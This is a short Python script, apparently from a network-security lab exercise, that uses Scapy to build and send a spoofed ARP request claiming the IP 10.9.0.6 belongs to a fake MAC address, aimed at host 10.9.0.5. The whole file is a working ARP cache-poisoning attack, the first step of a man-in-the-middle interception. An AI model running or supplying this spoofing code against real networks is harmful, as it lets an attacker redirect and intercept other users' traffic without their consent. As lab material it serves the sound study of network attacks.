#!/usr/bin/python3
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

A_IP_target = "10.9.0.5"
target_MAC = "ff:ff:ff:ff:ff:ff" #broadcasting mac addres while target mac is unkown

B_IP_fake = "10.9.0.6"
M_mac_fake = "02:42:0a:09:00:69"

#constructing the Ether header

ether = Ether()
ether.dst = target_MAC
ether.src = M_mac_fake  #spoofed mac adress


#constructing the arp packet
arp = ARP()
arp.hwsrc = M_mac_fake
arp.psrc = B_IP_fake
arp.hwdst = target_MAC
arp.pdst = A_IP_target

arp.op = 1

#building the frame to send apr request
frame = ether/arp

#sending the apr request
sendp(frame, iface = 'eth0')



